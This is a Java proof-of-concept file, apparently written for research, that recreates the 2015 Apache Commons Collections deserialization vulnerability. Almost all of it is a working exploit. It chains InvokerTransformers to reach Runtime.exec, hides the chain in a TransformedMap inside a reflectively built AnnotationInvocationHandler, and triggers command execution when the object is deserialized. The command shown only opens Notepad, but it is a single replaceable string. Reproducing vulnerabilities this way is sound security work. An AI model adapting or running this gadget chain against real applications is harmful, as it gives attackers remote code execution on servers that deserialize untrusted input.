package com.github.yihtserns.test.serialization.vulnerability;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Annotation;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.reflect.annotation.AnnotationType;

/**
 * Recreate issue reported by http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/.
 *
 * @author yihtserns
 */
public class Main {

    public static void main(String[] args) throws Exception {
        Object payload = createMaliciousPayload();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        ois.readObject();
        ois.close();
    }

    private static Object createMaliciousPayload() throws Exception {
        String execArgs = "cmd.exe /c start notepad";

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", arr(String.class, Class[].class), arr("getRuntime", new Class[0])),
            new InvokerTransformer("invoke", arr(Object.class, Object[].class), arr(null, new Object[0])),
            new InvokerTransformer("exec", arr(String.class), arr(execArgs)),
            new ConstantTransformer(1)
        });

        Class<? extends Annotation> annotationClass = SuppressWarnings.class;

        Map<String, Object> map = new HashMap(AnnotationType.getInstance(annotationClass).memberTypes());
        map = TransformedMap.decorate(map, transformerChain, transformerChain);

        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
                .getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        return constructor.newInstance(annotationClass, map);
    }

    private static <T> T[] arr(T... values) {
        return values;
    }

}
